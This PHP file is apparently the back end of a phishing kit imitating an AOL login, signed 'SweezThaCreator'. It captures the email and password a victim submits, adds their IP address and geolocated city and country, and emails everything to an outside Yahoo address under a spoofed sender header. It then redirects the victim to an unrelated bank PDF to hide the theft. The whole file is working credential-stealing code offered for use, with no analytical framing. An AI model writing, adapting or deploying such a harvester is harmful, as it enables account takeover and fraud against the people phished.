<?php

	require_once('geoplugin.class.php');
	$geoplugin = new geoPlugin();

    //get user's ip address 
    $geoplugin->locate();
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
    }

    $message = "";
    $message .= "---|BY SweezThaCreator|---\n";
	$message .= "Email Provider:AOL\n";
    $message .= "E: " . $_POST['email'] . "\n"; 
    $message .= "Ps: " . $_POST['password'] . "\n"; 
    $message .= "IP : " .$ip. "\n"; 
    $message .= "--------------------------\n";
    $message .=     "City: {$geoplugin->city}\n";
    $message .=     "Region: {$geoplugin->region}\n";
    $message .=     "Country Name: {$geoplugin->countryName}\n";
    $message .=     "Country Code: {$geoplugin->countryCode}\n";
    $message .= "--------------------------\n";

	$to ="ayoamosa@yahoo.com";

	$subject = "AOL | $ip";
	$headers = "From: Blessing <blessing@heaven.com>";

	$send = mail($to,$subject,$message,$headers);
	if($send){
		header("Location: https://ca.rbcwealthmanagement.com/documents/28252/28311/business+owners+guide+to+wealth+management.pdf/a524a377-771c-49a1-b67d-e80b3a0c1e0f");
	}
?>